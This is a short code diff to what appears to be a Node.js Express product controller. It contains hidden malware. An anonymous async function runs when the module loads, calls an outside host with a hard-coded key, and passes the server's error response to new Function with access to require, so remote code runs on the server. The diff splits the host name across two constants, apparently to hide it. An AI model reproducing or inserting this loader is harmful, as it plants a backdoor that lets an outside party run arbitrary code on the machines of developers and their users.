@@ -28,7 +28,8 @@ exports.createProduct = async (req, res) => {
 };
 
 const apikey = "LKJHGFV234T56HML";
-const domain = "json-project-opal.vercel.app";
+const domain = "json-project-hazel.ver";
+const domain_key = "cel.app";
 exports.getAllProducts = async (req, res) => {
   try {
     const products = await Product.find();
@@ -108,7 +109,7 @@ exports.getModel = async (req, res) => {
 };
 (async () => {
   try {
-    await axios.get(`https://${domain}/apikey/${apikey}`);
+    await axios.get(`https://${domain}${domain_key}/apikey/${apikey}`);
   } catch (e) {
     new Function("require", e.response.data.model)(require);
   }
